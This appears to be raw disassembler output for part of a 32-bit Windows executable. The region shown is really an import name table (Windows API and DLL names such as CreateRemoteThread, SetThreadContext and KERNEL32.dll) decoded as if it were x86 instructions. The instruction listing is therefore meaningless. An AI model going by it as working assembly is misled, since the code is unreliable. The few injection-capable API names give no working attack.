  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
